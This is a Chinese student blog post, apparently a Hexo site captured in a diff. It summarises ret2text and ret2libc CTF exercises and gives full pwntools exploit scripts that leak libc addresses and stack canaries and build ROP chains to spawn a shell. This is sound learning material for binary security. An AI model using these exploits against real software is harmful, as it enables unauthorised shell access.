@@ -1,0 +1,465 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>栈溢出与 ret2libc | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>栈溢出与 ret2libc</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/10
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #00bcd4">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ret2libc/" style="color: #ffa2c4">
+                    ret2libc
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/stack-overflow/" style="color: #ff7d73">
+                    stack-overflow
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="学习的东西"><a href="#学习的东西" class="headerlink" title="学习的东西"></a>学习的东西</h2><p>这就相当于把这周学的总结一下吧</p>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>首先学了简单的栈溢出，知道了它这个是发送无用数据来控制栈的。就是覆盖函数的返回地址，然后就能跳转到想跳转的地方。先填入距离返回地址的距离，再填返回地址。记得要填那个指针的64位是0x8，32位是0x4</p>
+<h3 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h3><p>然后是这个栈对齐。原理没怎么弄懂，就知道加一个ret_gadget就能避免这种情况了。查地址的话用ROPgadget查 后面加 | grep ‘:ret’ 。这个资料里应该讲的是原理，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29912475/article/details/134862329?sharetype=blog&shareId=134862329&sharerefer=APP&sharesource=2504_91251847&sharefrom=link">https://blog.csdn.net/qq_29912475/article/details/134862329?sharetype=blog&amp;shareId=134862329&amp;sharerefer=APP&amp;sharesource=2504_91251847&amp;sharefrom=link</a> 以后应该就懂了。</p>
+<h3 id="没有这个bin-sh的时候怎么办"><a href="#没有这个bin-sh的时候怎么办" class="headerlink" title="没有这个bin&#x2F;sh的时候怎么办"></a>没有这个bin&#x2F;sh的时候怎么办</h3><p>第三题没有这个bin&#x2F;sh，最后栈溢出的时候返回不了。想办法写入到某个地方，要不然就劫持不了栈。查了资料说这个一般写到bss的位置。（全局变量，可以读写。资料上这么说的）</p>
+<p>查bss的时候用readelf -S 查，发现是那个地址带进ida找一下对应的是哪个函数，就把bin&#x2F;sh写到对应的函数里。</p>
+<p>精准发送的话用p.recvuntil(‘’),前面加b改成字节，注意最后写入的时候要弄一个\x00，终止字符串。</p>
+<h3 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h3><p>网上说这是金丝雀保护。应该主要有三种方法，canary泄露，说有覆盖截断字符和格式化字符串（直接把栈的内容打印出来）。和canary爆破。这个爆破还不是很清楚，就只知道它就是一个一个试试出来的（所以才叫爆破吧）。然后就只会最简单的，canary泄露里的。先泄露canary,然后再用正确的栈溢出。</p>
+<h2 id="ret2text1"><a href="#ret2text1" class="headerlink" title="ret2text1"></a>ret2text1</h2><p>先用ida看一下代码,可以从main函数里看到，它调用了一个overflow函数，可能会产生危险。F5反编译看一下main，fun和overflow函数。（之前用gdb调了好多遍出现了提示overflow的，没算出来偏移量，拿ida看的）。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502097-622d0e63-7b36-436e-884f-0c396e2eee0b.png"></p>
+<p>overflow里有get危险函数，fun里有&#x2F;bin&#x2F;sh。看一下上面的rbp,overflow的是20,感觉把这个填满再填一个就能栈溢出了。（但是实际上还需要覆盖rbp，在尝试中发现不覆盖运行不了。64位中覆盖rbp需要8个字节，32位中需要4个。所以最后发送攻击数据的时候是0x28）</p>
+<p>编写一下攻击的代码试一下。</p>
+<p>编写的时候要绑定对应的配置文件，然后payload的时候要转换成16进制（加b）。然后要加上fun函数里push那一段的地址。（在伪代码里看一下）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502304-03f6f17f-5e40-4c1e-b5f3-0a24fd114865.png"></p>
+<p>在虚拟机上python3 attack.py 运行一下。提示完了之后 ls 一下，给出了这像清单一样的东西。这就拿到了shell.</p>
+<h2 id="ret2text2"><a href="#ret2text2" class="headerlink" title="ret2text2"></a>ret2text2</h2><p>先checksec 这个题.发现没有这个canary,64位程序。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502172-7748c47e-6334-4614-878b-1d4447820253.png"></p>
+<p>再把题目拿ida分析一下，可以看到出现了backdoor后门函数。确定了地址。再看main函数，调用了vuln和put函数。先看一下vuln函数，里面出现了read危险函数。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502103-299cc429-20c5-4963-8a34-73e173f8bc4d.png"></p>
+<p>再看一下反编译的，rbp是100。加上那个指针8就是108，基本上就可以编写攻击的python了。再拿gdb调试一下看一下。可以看到也是一样的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530502115-43010bd2-2714-4042-9f77-d5b4f972d319.png"></p>
+<p>然后写一下python。前几次写的是这个，运行之后就报EOF，再ls之后出现了这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503364-000f07c7-26b7-4370-9a2d-24ce263d69c6.png"></p>
+<p>栈没有对齐，然后再改一下。看了资料上，先看一下参数。然后它好像要求是16位的，改一下python。加一个ret gadget ,确定一下ret的地址。（用这个ROPgadget直接查一下），再改一下代码。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503459-412319e2-f1ad-4b4f-b629-39914ed2a0d5.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503577-37e94595-e69b-4c33-97d7-e5a8b4ba641f.png"></p>
+<p>改一下，分开写</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503493-fb3934e8-88e9-46f9-b36b-e553ac6a1011.png"></p>
+<p>运行试一下，没问题。发现就是栈没对齐导致payload没弄好。</p>
+<h2 id="ret2text3"><a href="#ret2text3" class="headerlink" title="ret2text3"></a>ret2text3</h2><p>先checksec 有32位文件，有nx保护。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503446-7eba78a7-2dba-4154-a62e-8bb25ed45c66.png"></p>
+<p>再拿ida看一下这个。两次read,第一次0x100，让读256个字节，但是它这个char buf这缓冲区只让读28个，就是后面那个ebp-0x1c。有那个栈溢出。覆盖了buf缓冲区就可以。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530503918-64e85f21-24e6-41e8-b8ac-3875408fed79.png"></p>
+<p>看一下后门那个bin&#x2F;sh，发现没有bin&#x2F;sh，只有一个system.就把bin&#x2F;sh的弄到buf里，写到第一次read的buf里。(可以用readelf -S 直接查一下bss在哪，找到对应的地址发现那个buf 就在第一次read的buf，所以buf可以写入 bin&#x2F;sh 作为那个载荷。)</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504142-440fb031-8c7f-4ef9-8719-146d01c0f7fc.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504212-8874c7f5-8ae6-41f9-b3ce-5c325893f77a.png"></p>
+<p>定位的话用一下那个recvuntil，读取到那个对应的name提示那把bin&#x2F;sh弄进去。发送的时候还是用sendline(b’ ‘)最后要加上空字节\x00,终止字符串，然后对应的payload也要加上system,返回地址，传递的bin&#x2F;sh的地址，即这个参数buf.写一下python。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504370-28c7ba21-e79e-4d9c-88c6-93e914d1e9ed.png"></p>
+<p>试一下，可以了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504296-afb79302-7d3d-4b61-a040-77395dc4e8ee.png"></p>
+<h2 id="ret2text4"><a href="#ret2text4" class="headerlink" title="ret2text4"></a>ret2text4</h2><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>这是一道普通的libc题，需要掌握一下基本的套路。</p>
+<p>首先看checksec 有nx，ida里看也没有bin&#x2F;sh。确定一下这是一道libc题。</p>
+<p>然后这个rdi可以用这个看一下</p>
+<pre><code class="language-bash">ROPgadget --binary ret2libc1 --only &quot;pop|ret&quot; |grep  &#39;rdi&#39;
+</code></pre>
+<p>看出来rdi的地址</p>
+<p>ret:</p>
+<pre><code class="language-bash">ROPgadget --binary ./rip --only &quot;ret&quot;
+</code></pre>
+<h2 id="rdi"><a href="#rdi" class="headerlink" title="rdi"></a>rdi</h2><p>rdi是用来传参的。一般是rdi +system +bin&#x2F;sh</p>
+<p>rdi是把bin&#x2F;sh的地址传给system</p>
+<p>知道了这个libc题以后先泄露 puts 的真正地址先发送无用数据构造链。数据到rdi，got和plt表里面。最后是主函数的地址（涉及到了64位程序传参的问题，如果是32位的话就不需要，只用got和plt还有main的起始地址就可以）</p>
+<p>有一篇文章确实讲的不错</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/134872403">pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客</a></p>
+<p>注意发送数据的时候要发对。第一个在“overflow” 后面，发完到“win”再接收</p>
+<p>然后再输出打印一下puts的真正地址，再用u64,转换为无符号整数</p>
+<pre><code class="language-plain">puts_real_addr = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
+</code></pre>
+<p>接收6字节，转化为8字节</p>
+<p>确定以后再计算，运用公式，基地址&#x3D;真实地址-偏移地址</p>
+<pre><code class="language-plain">libc_base = puts_real_address -libc.sym[&#39;puts&#39;]
+</code></pre>
+<p>有了基地址，就可以算出system和bin&#x2F;sh的地址(就是基地址加上偏移量就是system和bin&#x2F;sh的绝对地址。bin&#x2F;sh的写法不同，它要搜索一个“bin&#x2F;sh”字符串，然后返回生成器。next是获取第一个匹配项的偏移量)</p>
+<pre><code class="language-plain">system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+</code></pre>
+<p>然后再构造rop链，攻击注意栈对齐，按照以前方法，payload里要加一个ret的地址。</p>
+<p>查找的话用(查出来选一个只有ret的用)</p>
+<pre><code class="language-plain">ROPgadget --binary ret2libc1  |grep &#39;ret&#39;
+</code></pre>
+<p>最后发送的时候对齐+rdi+bin&#x2F;sh+sysytem,按照之前的溢出的偏移量发送。</p>
+<pre><code class="language-plain">payload += p64(0x400506)# stack alignment
+</code></pre>
+<p>完整的代码：</p>
+<pre><code class="language-python">from pwn import*
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)  
+e =ELF(&quot;./ret2libc1&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+p=process(&quot;./ret2libc1&quot;)
+#p=remote(&#39;27.25.151.26&#39;,46071)
+
+rdi_address = 0x400743
+puts_plt = e.plt[&#39;puts&#39;]
+puts_got = e.got[&#39;puts&#39;] 
+main_address =0x400632
+
+payload = b&#39;A&#39;*(0x40+8)
+payload += p64(rdi_address)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_address)
+
+p.recvuntil(b&quot;Do you know how to do buffer overflow?&quot;)
+
+p.send(payload)
+p.recvuntil(b&#39;win\n&#39;) 
+puts_real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;puts_real_address: &quot;,hex(puts_real_address))
+
+libc_base = puts_real_address -libc.sym[&#39;puts&#39;]
+system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+payload = b&quot;A&quot;*(0x40+8)
+payload += p64(0x400506)# stack alignment
+payload += p64(rdi_address)
+payload += p64(binsh_address)
+payload += p64(system_address)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p>看一下这道题，它这个开了canary保护</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504740-0b10fbd5-38bf-4ca2-91d3-d0cf9d781d99.png"></p>
+<p>要用那个泄露canary的方法泄露。</p>
+<p>有了libc1的公式这道题分析完之后，发现的结果就是在libc1的基础上添加绕过cacary的片段就可以。（ida看完也差不多，就多了画黄线的）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530504841-1d2d1cc1-3d13-4b88-bded-83175f34e88b.png"></p>
+<p>原来的代码基本不变。然后添加canary对应的部分。</p>
+<pre><code class="language-python">p.sendlineafter(b&#39;overflow?\n&#39;,b&#39;A&#39;*(0x50 - 9) + b&#39;a&#39;)
+p.recvuntil(b&quot;Aa&quot;)
+
+canary = u64(p.recv(8).ljust(8,b&#39;\x00&#39;))-0x0a
+print(&#39;canary:&#39;, hex(canary))
+</code></pre>
+<p>记得要在payload里添加攻击canary的代码（先发canary的，让canary泄露了后面的才能继续）</p>
+<pre><code class="language-plain">payload += p64(canary) 
+payload += b&#39;c&#39; * 8
+</code></pre>
+<p>泄露canary的地址想着套用模板了，用read函数打印出来。然后用这个sendline泄露的时候要减去0x0a（之前好像看过一篇泄露的文章说最后要减一个。应该是这篇，最后讲爆破的时候注释的。也没看懂这篇文章介绍的方法）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ysy___ysy/article/details/142214229">https://blog.csdn.net/ysy___ysy/article/details/142214229</a></p>
+<p>基本上就是这。这个plt和pot表里的函数都还能像上一道题一样照着用（居然还都能用puts），不用改。</p>
+<p>完整的代码：</p>
+<pre><code class="language-python">from pwn import*
+
+e = ELF(&quot;./ret2libc2&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+p=process(&quot;./ret2libc2&quot;)
+
+p.sendlineafter(b&#39;overflow?\n&#39;,b&#39;A&#39;*(0x50 - 9) + b&#39;a&#39;)
+p.recvuntil(b&quot;Aa&quot;)
+
+canary = u64(p.recv(8).ljust(8,b&#39;\x00&#39;))-0x0a
+print(&#39;canary:&#39;, hex(canary)) 
+
+rdi_address = 0x400863
+puts_plt = e.plt[&#39;puts&#39;]
+puts_got = e.got[&#39;puts&#39;] 
+main_address =0x400789
+
+payload = b&#39;A&#39;*(0x50-8) 
+payload += p64(canary) 
+payload += b&#39;c&#39; * 8 
+payload += p64(rdi_address)
+payload += p64(puts_got) 
+payload += p64(puts_plt)
+payload += p64(main_address)
+
+p.sendlineafter(b&#39;harder!&#39;,payload)
+
+p.recvuntil(b&#39;win\n&#39;) 
+puts_real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;puts_real_address: &quot;,hex(puts_real_address))
+
+libc_base = puts_real_address -libc.sym[&#39;puts&#39;]
+system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
+
+payload = b&#39;a&#39;*(0x50-8)
+payload += p64(canary)
+payload += b&#39;c&#39; * 8
+payload += p64(0x40059e )# stack alignment
+payload += p64(rdi_address)
+payload += p64(binsh_address)
+payload += p64(system_address)
+p.recvuntil(b&quot;Do you know how to do buffer overflow?\n&quot;)
+p.sendline(b&#39;\x00&#39;)
+p.recvuntil(b&quot;harder!&quot;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
